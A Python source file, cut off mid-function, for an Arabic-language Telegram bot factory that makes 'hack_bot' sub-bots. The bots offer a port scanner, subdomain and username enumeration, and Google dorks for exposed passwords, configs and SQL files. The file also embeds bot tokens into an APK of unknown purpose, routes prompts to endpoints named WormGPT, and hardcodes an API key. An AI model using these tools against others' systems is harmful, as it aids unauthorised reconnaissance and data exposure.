#!/usr/bin/env python3.9
import logging
import os
import json
import requests
import shutil
import random
import string
import time
import urllib.parse
import base64
import threading
import zipfile
import hashlib
import codecs
import zlib
import asyncio
import socket

from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
)
from telegram.constants import ParseMode
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
    CallbackContext,
)

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

# =============================================
# Global Variables
# =============================================
MAIN_BOT_TOKEN = os.getenv("MAIN_BOT_TOKEN", "")
VIRUSTOTAL_API_KEY = os.getenv("VIRUSTOTAL_API_KEY", "d851c6064844b30083483cbfa5a2001d9ac0b811a666f0110c0efb4eaab747e")
MAIN_ADMIN_ID = int(os.getenv("MAIN_ADMIN_ID", "6154678499"))
YOUR_BOT_TOKEN_FOR_APK = os.getenv("YOUR_BOT_TOKEN_FOR_APK", "")
YOUR_ADMIN_ID_FOR_APK = int(os.getenv("MAIN_ADMIN_ID", "6154678499"))

MAIN_CHANNELS = ["@xtt11x"]
FACTORY_MAIN_SUBSCRIPTION_CHANNEL = "@xtt11x"
FACTORY_MAIN_SUBSCRIPTION_ENABLED = True

DATABASE_DIR = "database"
if not os.path.exists(DATABASE_DIR):
    os.makedirs(DATABASE_DIR)

user_state = {}
created_bots = {}
running_made_bot_updaters = {}
FACTORY_ADMINS = [6154678499]

API_TEXT_TO_SPEECH = "https://sii3.moayman.top/api/voice.php"
API_AI_PRIMARY = "https://sii3.moayman.top/api/gemini-pro.php"
API_IMAGE_GENERATION_NEW = "http://sii3.moayman.top/api/img.php"
API_AI_FALLBACK_1 = "https://sii3.moayman.top/api/openai.php"
API_AI_FALLBACK_2 = "http://67f3d369ebd19.xvest5.ru/api/WormGPT.php"
API_AI_FALLBACK_3 = "http://sii3.moayman.top/DARK/api/wormgpt.php"
API_SHEREEN_AI = "http://sii3.moayman.top/api/s.php"
API_DEEPSEEK_AI = "https://sii3.moayman.top/api/deepseek.php"
API_CHATGPT_3_5 = "http://sii3.moayman.top/api/chat/gpt-3.5.php"
API_AZKAR = "http://sii3.moayman.top/api/azkar.php"

ORIGINAL_APK_PATH = "/home/container/app_modified_7946719176.apk"
APK_TOKEN_FILE_INSIDE = "assets/bot_token.txt"

DEFAULT_BOT_SETTINGS = {
    "channels": [FACTORY_MAIN_SUBSCRIPTION_CHANNEL] if FACTORY_MAIN_SUBSCRIPTION_ENABLED else [],
    "notifications": "off",
    "bot_status": "on",
    "payment_status": "free",
    "banned_users": [],
    "members": [],
    "additional_check_channel": "@xtt11x",
    "start_message": "**مرحبًا! بك كل الازرار مجاناً:**",
    "rembo_state": None,
    "features_channel": None,
    "points": {},
    "referred_users": [],
    "payload_points_required": 1,
    "custom_buttons": [],
    "custom_buttons_enabled_by_admin": False,
    "bot_type": "hack_bot",
    "main_channel_link": None,
    "paid_users": [],
    "parent_factory_admin_id": None,
    "factory_sub_admins": []
}

bot_user_states = {}
user_last_interaction_time = {}
made_bot_data = {}


# =============================================
# Helper Functions
# =============================================
def check_subscription(user_id, channels, bot_token):
    for channel in channels:
        try:
            if channel == FACTORY_MAIN_SUBSCRIPTION_CHANNEL:
                resp = requests.get(
                    f"https://api.telegram.org/bot{MAIN_BOT_TOKEN}/getChatMember?chat_id={channel}&user_id={user_id}"
                ).json()
            else:
                resp = requests.get(
                    f"https://api.telegram.org/bot{bot_token}/getChatMember?chat_id={channel}&user_id={user_id}"
                ).json()
            if not resp.get("ok") or resp["result"]["status"] not in [
                "member", "administrator", "creator"
            ]:
                return False
        except Exception as e:
            logging.error(f"Error checking subscription for {user_id} in {channel}: {e}")
            return False
    return True


def get_channel_name(channel_id, bot_token):
    try:
        resp = requests.get(
            f"https://api.telegram.org/bot{bot_token}/getChat?chat_id={channel_id}"
        ).json()
        if resp.get("ok"):
            return resp["result"]["title"]
    except Exception as e:
        logging.error(f"Error getting channel name: {e}")
    return channel_id


async def send_msg(bot_instance, chat_id, text, reply_markup=None, parse_mode=None):
    try:
        await bot_instance.send_message(
            chat_id=chat_id,
            text=text,
            reply_markup=reply_markup,
            parse_mode=parse_mode
        )
    except Exception as e:
        logging.error(f"Error sending message to {chat_id}: {e}")


async def edit_msg(bot_instance, chat_id, message_id, text, reply_markup=None, parse_mode=None):
    try:
        await bot_instance.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text=text,
            reply_markup=reply_markup,
            parse_mode=parse_mode
        )
    except Exception as e:
        logging.error(f"Error editing message: {e}")


def clean_api_response(text):
    if not isinstance(text, str):
        return text
    phrases_to_remove = [
        "اشترك في قناتنا", "اشترك بقناتنا", "@RLH5500", "@RLH20", "@RLH550",
        "Dont forget to support the channel"
    ]
    cleaned_text = text
    for phrase in phrases_to_remove:
        cleaned_text = cleaned_text.replace(phrase, "").strip()
    return ' '.join(cleaned_text.split())


def encrypt_token(token):
    table = str.maketrans(
        "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
        "zyxwvutsrqponmlkjihgfedcbaZYXWVUTSRQPONMLKJIHGFEDCBA9876543210"
    )
    return token.translate(table)


def modify_apk_with_token(original_apk_path, encrypted_token, output_apk_path):
    try:
        temp_apk_path = output_apk_path + ".tmp"
        shutil.copyfile(original_apk_path, temp_apk_path)
        with zipfile.ZipFile(temp_apk_path, 'a', zipfile.ZIP_DEFLATED) as zf:
            zf.writestr(APK_TOKEN_FILE_INSIDE, encrypted_token.encode())
        shutil.move(temp_apk_path, output_apk_path)
        return True
    except Exception as e:
        logging.error(f"Error modifying APK: {e}")
        return False


def get_made_bot_data_path(bot_username):
    return os.path.join(DATABASE_DIR, f"{bot_username}_settings.json")


def load_made_bot_settings(bot_username):
    file_path = get_made_bot_data_path(bot_username)
    if os.path.exists(file_path):
        with open(file_path, 'r') as f:
            settings = json.load(f)
            made_bot_data[bot_username] = {**DEFAULT_BOT_SETTINGS, **settings}
            if not isinstance(made_bot_data[bot_username].get("points"), dict):
                made_bot_data[bot_username]["points"] = {}
            if not isinstance(made_bot_data[bot_username].get("referred_users"), list):
                made_bot_data[bot_username]["referred_users"] = []
            if not isinstance(made_bot_data[bot_username].get("paid_users"), list):
                made_bot_data[bot_username]["paid_users"] = []
            if not isinstance(made_bot_data[bot_username].get("factory_sub_admins"), list):
                made_bot_data[bot_username]["factory_sub_admins"] = []
    else:
        made_bot_data[bot_username] = DEFAULT_BOT_SETTINGS.copy()
        save_made_bot_settings(bot_username)


def save_made_bot_settings(bot_username):
    with open(get_made_bot_data_path(bot_username), 'w') as f:
        json.dump(made_bot_data.get(bot_username, DEFAULT_BOT_SETTINGS), f, indent=4)


def get_bot_admin_id(bot_username):
    path = os.path.join(DATABASE_DIR, f"{bot_username}.json")
    if os.path.exists(path):
        with open(path, 'r') as f:
            return json.load(f).get("admin_id")
    return None


def get_bot_type(bot_username):
    path = os.path.join(DATABASE_DIR, f"{bot_username}.json")
    if os.path.exists(path):
        with open(path, 'r') as f:
            return json.load(f).get("bot_type", "hack_bot")
    return "hack_bot"


def get_bot_token_from_username(bot_username):
    path = os.path.join(DATABASE_DIR, f"{bot_username}.json")
    if os.path.exists(path):
        with open(path, 'r') as f:
            return json.load(f).get("token")
    return None


def get_bot_username_from_token(bot_token):
    try:
        resp = requests.get(f"https://api.telegram.org/bot{bot_token}/getMe").json()
        if resp.get("ok"):
            return resp["result"]["username"]
    except Exception as e:
        logging.error(f"Error getting bot username from token: {e}")
    return None


# =============================================
# Encryption Bot Functions
# =============================================
def get_encryption_types_keyboard():
    keyboard = [
        [InlineKeyboardButton("Base64 🔠", callback_data="enc_type_base64"),
         InlineKeyboardButton("Hex 🔢", callback_data="enc_type_hex")],
        [InlineKeyboardButton("ROT13 🔄", callback_data="enc_type_rot13"),
         InlineKeyboardButton("SHA256 🛡️", callback_data="enc_type_sha256")],
        [InlineKeyboardButton("Gzip 📦", callback_data="enc_type_gzip"),
         InlineKeyboardButton("Reverse ⏪", callback_data="enc_type_reverse")],
        [InlineKeyboardButton("رجوع↩️", callback_data="back_to_main_encryption_menu")]
    ]
    return InlineKeyboardMarkup(keyboard)


def encrypt_data(data, enc_type):
    if enc_type == "base64":
        return base64.b64encode(data)
    elif enc_type == "hex":
        return data.hex().encode('utf-8')
    elif enc_type == "rot13":
        return codecs.encode(data.decode('utf-8', errors='ignore'), 'rot_13').encode('utf-8')
    elif enc_type == "sha256":
        return hashlib.sha256(data).hexdigest().encode('utf-8')
    elif enc_type == "gzip":
        return zlib.compress(data)
    elif enc_type == "reverse":
        return data[::-1]
    return b"Error"


def decrypt_data(data, enc_type):
    if enc_type == "base64":
        try:
            return base64.b64decode(data)
        except:
            return b"Error: Invalid Base64"
    elif enc_type == "hex":
        try:
            return bytes.fromhex(data.decode('utf-8'))
        except:
            return b"Error: Invalid Hex"
    elif enc_type == "rot13":
        try:
            return codecs.encode(data.decode('utf-8', errors='ignore'), 'rot_13').encode('utf-8')
        except:
            return b"Error: Invalid ROT13"
    elif enc_type == "sha256":
        return b"SHA256 is one-way hash."
    elif enc_type == "gzip":
        try:
            return zlib.decompress(data)
        except:
            return b"Error: Invalid Gzip"
    elif enc_type == "reverse":
        return data[::-1]
    return b"Error"


# =============================================
# Name Decoration Functions
# =============================================
def decorate_english_name(name):
    maps = [
        ("Bold Italic", {
            'A': '𝑨', 'B': '𝑩', 'C': '𝑪', 'D': '𝑫', 'E': '𝑬', 'F': '𝑭', 'G': '𝑮',
            'H': '𝑯', 'I': '𝑰', 'J': '𝑱', 'K': '𝑲', 'L': '𝑳', 'M': '𝑴', 'N': '𝑵',
            'O': '𝑶', 'P': '𝑷', 'Q': '𝑸', 'R': '𝑹', 'S': '𝑺', 'T': '𝑻', 'U': '𝑼',
            'V': '𝑽', 'W': '𝑾', 'X': '𝑿', 'Y': '𝒀', 'Z': '𝒁',
            'a': '𝒂', 'b': '𝒃', 'c': '𝒄', 'd': '𝒅', 'e': '𝒆', 'f': '𝒇', 'g': '𝒈',
            'h': '𝒉', 'i': '𝒊', 'j': '𝒋', 'k': '𝒌', 'l': '𝒍', 'm': '𝒎', 'n': '𝒏',
            'o': '𝒐', 'p': '𝒑', 'q': '𝒒', 'r': '𝒓', 's': '𝒔', 't': '𝒕', 'u': '𝒖',
            'v': '𝒗', 'w': '𝒘', 'x': '𝒙', 'y': '𝒚', 'z': '𝒛'
        }),
        ("Monospace", {
            'A': '𝙰', 'B': '𝙱', 'C': '𝙲', 'D': '𝙳', 'E': '𝙴', 'F': '𝙵', 'G': '𝙶',
            'H': '𝙷', 'I': '𝙸', 'J': '𝙹', 'K': '𝙺', 'L': '𝙻', 'M': '𝙼', 'N': '𝙽',
            'O': '𝙾', 'P': '𝙿', 'Q': '𝚀', 'R': '𝚁', 'S': '𝚂', 'T': '𝚃', 'U': '𝚄',
            'V': '𝚅', 'W': '𝚆', 'X': '𝚇', 'Y': '𝚈', 'Z': '𝚉',
            'a': '𝚊', 'b': '𝚋', 'c': '𝚌', 'd': '𝚍', 'e': '𝚎', 'f': '𝚏', 'g': '𝚐',
            'h': '𝚑', 'i': '𝚒', 'j': '𝚓', 'k': '𝚔', 'l': '𝚕', 'm': '𝚖', 'n': '𝚗',
            'o': '𝚘', 'p': '𝚙', 'q': '𝚚', 'r': '𝚛', 's': '𝚜', 't': '𝚝', 'u': '𝚞',
            'v': '𝚟', 'w': '𝚠', 'x': '𝚡', 'y': '𝚢', 'z': '𝚣'
        }),
        ("Circled", {
            'A': 'Ⓐ', 'B': 'Ⓑ', 'C': 'Ⓒ', 'D': 'Ⓓ', 'E': 'Ⓔ', 'F': 'Ⓕ', 'G': 'Ⓖ',
            'H': 'Ⓗ', 'I': 'Ⓘ', 'J': 'Ⓙ', 'K': 'Ⓚ', 'L': 'Ⓛ', 'M': 'Ⓜ', 'N': 'Ⓝ',
            'O': 'Ⓞ', 'P': 'Ⓟ', 'Q': 'Ⓠ', 'R': 'Ⓡ', 'S': 'Ⓢ', 'T': 'Ⓣ', 'U': 'Ⓤ',
            'V': 'Ⓥ', 'W': 'Ⓦ', 'X': 'Ⓧ', 'Y': 'Ⓨ', 'Z': 'Ⓩ',
            'a': 'ⓐ', 'b': 'ⓑ', 'c': 'ⓒ', 'd': 'ⓓ', 'e': 'ⓔ', 'f': 'ⓕ', 'g': 'ⓖ',
            'h': 'ⓗ', 'i': 'ⓘ', 'j': 'ⓙ', 'k': 'ⓚ', 'l': 'ⓛ', 'm': 'ⓜ', 'n': 'ⓝ',
            'o': 'ⓞ', 'p': 'ⓟ', 'q': 'ⓠ', 'r': 'ⓡ', 's': 'ⓢ', 't': 'ⓣ', 'u': 'ⓤ',
            'v': 'ⓥ', 'w': 'ⓦ', 'x': 'ⓧ', 'y': 'ⓨ', 'z': 'ⓩ'
        }),
        ("Double Struck", {
            'A': '𝔸', 'B': '𝔹', 'C': 'ℂ', 'D': '𝔻', 'E': '𝔼', 'F': '𝔽', 'G': '𝔾',
            'H': 'ℍ', 'I': '𝕀', 'J': '𝕁', 'K': '𝕂', 'L': '𝕃', 'M': '𝕄', 'N': 'ℕ',
            'O': '𝕆', 'P': 'ℙ', 'Q': 'ℚ', 'R': 'ℝ', 'S': '𝕊', 'T': '𝕋', 'U': '𝕌',
            'V': '𝕍', 'W': '𝕎', 'X': '𝕏', 'Y': '𝕐', 'Z': 'ℤ',
            'a': '𝕒', 'b': '𝕓', 'c': '𝕔', 'd': '𝕕', 'e': '𝕖', 'f': '𝕗', 'g': '𝕘',
            'h': '𝕙', 'i': '𝕚', 'j': '𝕛', 'k': '𝕜', 'l': '𝕝', 'm': '𝕞', 'n': '𝕟',
            'o': '𝕠', 'p': '𝕡', 'q': '𝕢', 'r': '𝕣', 's': '𝕤', 't': '𝕥', 'u': '𝕦',
            'v': '𝕧', 'w': '𝕨', 'x': '𝕩', 'y': '𝕪', 'z': '𝕫'
        }),
        ("Squared", {
            'A': '🄰', 'B': '🄱', 'C': '🄲', 'D': '🄳', 'E': '🄴', 'F': '🄵', 'G': '🄶',
            'H': '🄷', 'I': '🄸', 'J': '🄹', 'K': '🄺', 'L': '🄻', 'M': '🄼', 'N': '🄽',
            'O': '🄾', 'P': '🄿', 'Q': '🅀', 'R': '🅁', 'S': '🅂', 'T': '🅃', 'U': '🅄',
            'V': '🅅', 'W': '🅆', 'X': '🅇', 'Y': '🅈', 'Z': '🅉',
            'a': '🄰', 'b': '🄱', 'c': '🄲', 'd': '🄳', 'e': '🄴', 'f': '🄵', 'g': '🄶',
            'h': '🄷', 'i': '🄸', 'j': '🄹', 'k': '🄺', 'l': '🄻', 'm': '🄼', 'n': '🄽',
            'o': '🄾', 'p': '🄿', 'q': '🅀', 'r': '🅁', 's': '🅂', 't': '🅃', 'u': '🅄',
            'v': '🅅', 'w': '🅆', 'x': '🅇', 'y': '🅈', 'z': '🅉'
        }),
    ]
    result_lines = []
    for title, mapping in maps:
        decorated = "".join(mapping.get(c, c) for c in name)
        result_lines.append(f"{title}:\n{decorated}")
    return "\n\n".join(result_lines)


def decorate_arabic_name(name):
    styles = [
        ("ٰ", "➊"), ("ّ", "➋"), ("ْ", "➌"), ("ٓ", "➍"), ("ٌ", "➎")
    ]
    result_lines = []
    for mark, label in styles:
        decorated = "".join(f"{c}{mark}" if c.isalpha() else c for c in name)
        result_lines.append(f"{label}:\n{decorated}")
    return "\n\n".join(result_lines)


# =============================================
# API Interaction Functions
# =============================================
def interact_with_ai_api(prompt, api_type, bot_username, user_id):
    prefix = {"ai": "", "dream_interpret": "تفسير الحلم التالي بالتفصيل: ", "blue_genie_game": "لعبة المارد الأزرق (أجب بذكاء ومرح): "}.get(api_type, "")
    full_prompt = f"{prefix}{prompt}" if prefix else prompt
    apis = [
        (API_AI_PRIMARY, {"q": full_prompt}),
        (API_CHATGPT_3_5, {"ai": full_prompt}),
        (API_DEEPSEEK_AI, {"q": full_prompt}),
        (API_SHEREEN_AI, {"q": full_prompt}),
        (API_AI_FALLBACK_1, {"gpt-5-mini": full_prompt}),
        (API_AI_FALLBACK_2, {"WR1": full_prompt}),
        (API_AI_FALLBACK_3, {"text": full_prompt}),
    ]
    for url, params in apis:
        try:
            resp = requests.get(url, params=params, timeout=10)
            resp.raise_for_status()
            try:
                json_resp = resp.json()
                for key in ['response', 'answer', 'result', 'output']:
                    if key in json_resp:
                        return clean_api_response(json_resp[key])
                if 'text' in json_resp:
                    return clean_api_response(json.dumps(json_resp, ensure_ascii=False))
            except json.JSONDecodeError:
                return clean_api_response(resp.text.strip())
        except Exception as e:
            logging.error(f"API call failed: {e}")
            continue
    return "عذرا، حدث خطأ أثناء معالجة طلبك. حاول مرة أخرى لاحقا."


def generate_image_via_api(prompt, bu, uid):
    try:
        resp = requests.get(API_IMAGE_GENERATION_NEW, params={"text": prompt}, timeout=15)
        resp.raise_for_status()
        try:
            json_resp = resp.json()
            return json_resp.get('image_url') or json_resp.get('url')
        except:
            return resp.text.strip()
    except Exception as e:
        logging.error(f"Error generating image: {e}")
        return None


def convert_text_to_speech_via_api(text, bu, uid):
    try:
        resp = requests.get(
            f"{API_TEXT_TO_SPEECH}?text={urllib.parse.quote(text)}&voice=nova&style=cheerful+tone",
            timeout=15
        )
        resp.raise_for_status()
        try:
            json_resp = resp.json()
            return json_resp.get('voice') or json_resp.get('url')
        except:
            return resp.text.strip()
    except Exception as e:
        logging.error(f"Error converting text to speech: {e}")
        return None


def get_azkar_via_api(bu, uid):
    try:
        resp = requests.get(API_AZKAR, timeout=10)
        resp.raise_for_status()
        try:
            json_resp = resp.json()
            if 'zekr' in json_resp:
                return clean_api_response(
                    f"*{json_resp['zekr']}*\n\nالوقت: {json_resp.get('time', 'غير معروف')}\nالتاريخ: {json_resp.get('date', 'غير معروف')}\nنوع الذكر: {json_resp.get('type', 'غير معروف')}"
                )
            return clean_api_response(json.dumps(json_resp, ensure_ascii=False))
        except json.JSONDecodeError:
            return clean_api_response(resp.text.strip())
    except Exception as e:
        logging.error(f"Error getting azkar: {e}")
        return "عذرا، حدث خطأ أثناء جلب الأذكار. حاول مرة أخرى لاحقا."


def check_url_virustotal_data(url_to_check):
    try:
        if not url_to_check.startswith(('http://', 'https://')):
            return None, "الرجاء إرسال رابط صحيح يبدأ بـ http:// أو https://"
        url_id = base64.urlsafe_b64encode(url_to_check.encode()).decode().strip("=")
        headers = {"x-apikey": VIRUSTOTAL_API_KEY}
        resp = requests.get(f"https://www.virustotal.com/api/v3/urls/{url_id}", headers=headers)
        if resp.status_code == 200:
            stats = resp.json()['data']['attributes']['last_analysis_stats']
            result = (
                f"📊 *نتائج فحص الرابط:*\n\n"
                f"✅ آمن: {stats['harmless']}\n"
                f"⚠️ ضار: {stats['malicious']}\n"
                f"❓ مشبوه: {stats['suspicious']}\n"
                f"🔄 تم التحليل: {stats['undetected']}"
            )
            return result, None
        return None, "❌ حدث خطأ أثناء فحص الرابط."
    except Exception as e:
        logging.error(f"Error checking URL: {e}")
        return None, f"❌ حدث خطأ: {e}"


# =============================================
# OSINT Tools Functions
# =============================================
def tool_ip_lookup(ip):
    try:
        resp = requests.get(f"http://ip-api.com/json/{ip}?lang=ar", timeout=10).json()
        if resp.get("status") == "success":
            return (
                f"🔍 *نتائج فحص IP:* `{ip}`\n\n"
                f"🌍 الدولة: {resp.get('country', 'غير معروف')}\n"
                f"🏙️ المدينة: {resp.get('city', 'غير معروف')}\n"
                f"📡 المنطقة: {resp.get('regionName', 'غير معروف')}\n"
                f"🌐 مزود الخدمة: {resp.get('isp', 'غير معروف')}\n"
                f"📍 الإحداثيات: {resp.get('lat', '?')}, {resp.get('lon', '?')}\n"
                f"🕐 المنطقة الزمنية: {resp.get('timezone', 'غير معروف')}\n"
                f"📮 الرمز البريدي: {resp.get('zip', 'غير معروف')}"
            )
        return "❌ لم يتم العثور على معلومات لهذا العنوان."
    except Exception as e:
        return f"❌ خطأ: {e}"


def tool_generate_password(length=16):
    chars = string.ascii_letters + string.digits + "!@#$%^&*"
    password = ''.join(random.choice(chars) for _ in range(length))
    strength = "ضعيف" if length < 8 else ("متوسط" if length < 12 else "قوي جداً")
    return (
        f"🔐 *كلمة المرور المولدة:*\n\n"
        f"`{password}`\n\n"
        f"📏 الطول: {length}\n"
        f"💪 القوة: {strength}"
    )


def tool_qr_code(text):
    encoded = urllib.parse.quote(text)
    return f"https://api.qrserver.com/v1/create-qr-code/?size=300x300&data={encoded}"


def tool_hash_info(text):
    data = text.encode('utf-8')
    md5 = hashlib.md5(data).hexdigest()
    sha1 = hashlib.sha1(data).hexdigest()
    sha256 = hashlib.sha256(data).hexdigest()
    sha512 = hashlib.sha512(data).hexdigest()
    return (
        f"🛡️ *نتائج الهاش:*\n\n"
        f"*MD5:*\n`{md5}`\n\n"
        f"*SHA1:*\n`{sha1}`\n\n"
        f"*SHA256:*\n`{sha256}`\n\n"
        f"*SHA512:*\n`{sha512}`"
    )


def tool_dns_lookup(domain):
    try:
        records = []
        for rtype in ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME']:
            try:
                resp = requests.get(f"https://dns.google/resolve?name={domain}&type={rtype}", timeout=5).json()
                if resp.get("Answer"):
                    for answer in resp["Answer"]:
                        records.append(f"  {rtype}: `{answer.get('data', '')}`")
            except:
                continue
        if records:
            return f"🌐 *سجلات DNS لـ* `{domain}`:\n\n" + "\n".join(records)
        return f"❌ لم يتم العثور على سجلات DNS لـ {domain}"
    except Exception as e:
        return f"❌ خطأ: {e}"


def tool_port_scan(host):
    ports_map = {
        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
        80: "HTTP", 110: "POP3", 143: "IMAP", 443: "HTTPS", 445: "SMB",
        993: "IMAPS", 995: "POP3S", 3306: "MySQL", 3389: "RDP",
        5432: "PostgreSQL", 8080: "HTTP-Proxy", 8443: "HTTPS-Alt"
    }
    open_ports = []
    for port, service in ports_map.items():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((host, port))
            if result == 0:
                open_ports.append(f"  ✅ البورت {port} ({service}): مفتوح")
            sock.close()
        except:
            pass
    if open_ports:
        return f"🔍 *فحص البورتات لـ* `{host}`:\n\n" + "\n".join(open_ports)
    return f"❌ لم يتم العثور على بورتات مفتوحة لـ {host}"


def tool_ssl_info(domain):
    try:
        import ssl as ssl_module
        context = ssl_module.create_default_context()
        with socket.create_connection((domain, 443), timeout=5) as sock:
            with context.wrap_socket(sock, server_hostname=domain) as ssock:
                cert = ssock.getpeercert()
                subject = dict(x[0] for x in cert.get('subject', []))
                issuer = dict(x[0] for x in cert.get('issuer', []))
                return (
                    f"🔒 *معلومات SSL لـ* `{domain}`:\n\n"
                    f"📋 الصادرة لـ: {subject.get('commonName', 'غير معروف')}\n"
                    f"🏢 الجهة المصدرة: {issuer.get('organizationName', 'غير معروف')}\n"
                    f"📅 تبدأ: {cert.get('notBefore', 'غير معروف')}\n"
                    f"📅 تنتهي: {cert.get('notAfter', 'غير معروف')}\n"
                    f"🔢 الإصدار: {cert.get('version', 'غير معروف')}"
                )
    except Exception as e:
        return f"❌ خطأ في فحص SSL: {e}"


def tool_subdomain_finder(domain):
    try:
        resp = requests.get(f"https://crt.sh/?q=%.{domain}&output=json", timeout=15)
        if resp.status_code == 200:
            data = resp.json()
            subdomains = set()
            for entry in data:
                name = entry.get("name_value", "")
                for sub in name.split("\n"):
                    if sub.endswith(domain):
                        subdomains.add(sub.strip())
            if subdomains:
                subs_list = sorted(subdomains)[:30]
                result = f"🔍 *النطاقات الفرعية لـ* `{domain}`:\n\n"
                for i, sub in enumerate(subs_list, 1):
                    result += f"  {i}. `{sub}`\n"
                if len(subdomains) > 30:
                    result += f"\n... والمزيد ({len(subdomains)} نطاق)"
                return result
            return f"❌ لم يتم العثور على نطاقات فرعية لـ {domain}"
        return "❌ خطأ في الاتصال بـ crt.sh"
    except Exception as e:
        return f"❌ خطأ: {e}"


def tool_http_headers(domain):
    try:
        url = domain if domain.startswith("http") else f"https://{domain}"
        resp = requests.get(url, timeout=10, allow_redirects=True)
        headers = resp.headers
        security_headers = {
            "Strict-Transport-Security": "HSTS",
            "Content-Security-Policy": "CSP",
            "X-Content-Type-Options": "X-Content-Type",
            "X-Frame-Options": "X-Frame-Options",
            "X-XSS-Protection": "XSS Protection",
            "Referrer-Policy": "Referrer Policy",
        }
        result = f"🛡️ *فحص رؤوس HTTP لـ* `{domain}`:\n\n"
        for header, name in security_headers.items():
            value = headers.get(header)
            if value:
                result += f"✅ {name}: موجود\n"
            else:
                result += f"❌ {name}: مفقود\n"
        return result
    except Exception as e:
        return f"❌ خطأ: {e}"


def tool_whois_lookup(domain):
    try:
        resp = requests.get(f"https://rdap.org/domain/{domain}", timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            name = data.get("ldhName", domain)
            status = data.get("status", [])
            events = data.get("events", [])
            result = f"📋 *معلومات Whois لـ* `{name}`:\n\n"
            result += f"📌 الحالة: {', '.join(status)}\n"
            for event in events:
                action = event.get("eventAction", "")
                date = event.get("eventDate", "")
                result += f"📅 {action}: {date}\n"
            entities = data.get("entities", [])
            for entity in entities:
                roles = entity.get("roles", [])
                vcards = entity.get("vcardArray", [])
                if len(vcards) > 1:
                    for item in vcards[1]:
                        if item[0] == "fn":
                            result += f"👤 {', '.join(roles)}: {item[3]}\n"
            return result
        return f"❌ لم يتم العثور على معلومات لـ {domain}"
    except Exception as e:
        return f"❌ خطأ: {e}"


def tool_google_dork(topic):
    dorks = [
        f'site:{topic} filetype:pdf',
        f'site:{topic} filetype:sql',
        f'site:{topic} filetype:log',
        f'site:{topic} intitle:"index of"',
        f'site:{topic} ext:php inurl:admin',
        f'site:{topic} inurl:login',
        f'"{topic}" filetype:doc OR filetype:docx OR filetype:xls',
        f'site:{topic} inurl:backup',
        f'site:{topic} intext:"password" OR intext:"username"',
        f'site:{topic} ext:xml inurl:config',
    ]
    result = f"🔍 *Google Dorking لـ* `{topic}`:\n\n"
    for i, dork in enumerate(dorks, 1):
        encoded = urllib.parse.quote(dork)
        result += f"{i}. `{dork}`\n   [بحث Google](https://www.google.com/search?q={encoded})\n\n"
    return result


def tool_url_encode_decode(text, mode="encode"):
    if mode == "encode":
        result = urllib.parse.quote(text)
        return f"🔗 *تشفير URL:*\n\n`{result}`"
    else:
        result = urllib.parse.unquote(text)
        return f"🔗 *فك تشفير URL:*\n\n`{result}`"


def tool_base64_encode_decode(text, mode="encode"):
    if mode == "encode":
        result = base64.b64encode(text.encode()).decode()
        return f"🔠 *تشفير Base64:*\n\n`{result}`"
    else:
        try:
            result = base64.b64decode(text).decode()
            return f"🔠 *فك تشفير Base64:*\n\n`{result}`"
        except:
            return "❌ بيانات Base64 غير صالحة"


def tool_mac_lookup(mac):
    try:
        resp = requests.get(f"https://api.macvendors.com/{mac}", timeout=10)
        if resp.status_code == 200:
            return f"🔍 *معلومات MAC Address:*\n\n📍 العنوان: `{mac}`\n🏢 الشركة المصنعة: {resp.text}"
        return "❌ لم يتم العثور على معلومات لهذا العنوان"
    except Exception as e:
        return f"❌ خطأ: {e}"


def tool_email_check(email):
    try:
        domain = email.split("@")[1]
        resp = requests.get(f"https://dns.google/resolve?name={domain}&type=MX", timeout=5).json()
        if resp.get("Answer"):
            mx_records = "\n".join(f"  `{a.get('data', '')}`" for a in resp["Answer"][:5])
            return f"📧 *فحص البريد:* `{email}`\n\n✅ النطاق: `{domain}`\n📬 سجلات MX:\n{mx_records}"
        return f"❌ النطاق `{domain}` لا يحتوي على سجلات MX"
    except Exception as e:
        return f"❌ خطأ: {e}"


def tool_username_osint(username):
    platforms = {
        "Instagram": f"https://www.instagram.com/{username}/",
        "Twitter/X": f"https://x.com/{username}",
        "TikTok": f"https://www.tiktok.com/@{username}",
        "GitHub": f"https://github.com/{username}",
        "Reddit": f"https://www.reddit.com/user/{username}",
        "YouTube": f"https://www.youtube.com/@{username}",
        "Facebook": f"https://www.facebook.com/{username}",
        "Telegram": f"https://t.me/{username}",
        "Snapchat": f"https://www.snapchat.com/add/{username}",
        "Steam": f"https://steamcommunity.com/id/{username}",
    }
    result = f"🔍 *البحث عن يوزر:* `{username}`\n\n"
    for platform, url in platforms.items():
        try:
            resp = requests.get(url, timeout=5, allow_redirects=True)
            if resp.status_code == 200:
                result += f"✅ {platform}: موجود\n   {url}\n"
            elif resp.status_code == 404:
                result += f"❌ {platform}: غير موجود\n"
            else:
                result += f"⚠️ {platform}: غير مؤكد\n"
        except:
            result += f"⚠️ {platform}: خطأ في الاتصال\n"
    return result


def tool_ping(host):
    try:
        import subprocess
        result = subprocess.run(["ping", "-c", "4", host], capture_output=True, text=True, timeout=15)
        if result.returncode == 0:
            return f"📡 *نتائج Ping لـ* `{host}`:\n\n```\n{result.stdout[:1000]}\n```"
        return f"❌ فشل Ping لـ {host}"
    except Exception as e:
        return f"❌ خطأ: {e}"


def tool_traceroute(host):
    try:
        import subprocess
        result = subprocess.run(["traceroute", "-m", "15", host], capture_output=True, text=True, timeout=30)
        if result.returncode == 0:
            return f"🗺️ *تتبع المسار لـ* `{host}`:\n\n```\n{result.stdout[:1500]}\n```"
        return f"❌ فشل تتبع المسار لـ {host}"
    except Exception as e:
        return f"❌ خطأ: {e}"


def tool_cidr_info(cidr):
    try:
        import ipaddress
        network = ipaddress.ip_network(cidr, strict=False)
        return (
            f"🌐 *معلومات الشبكة:*\n\n"
            f"📡 الشبكة: `{network.network_address}`\n"
            f"🎭 القناع: `{network.netmask}`\n"
            f"📡 البث: `{network.broadcast_address}`\n"
            f"📊 عدد العناوين: `{network.num_addresses}`\n"
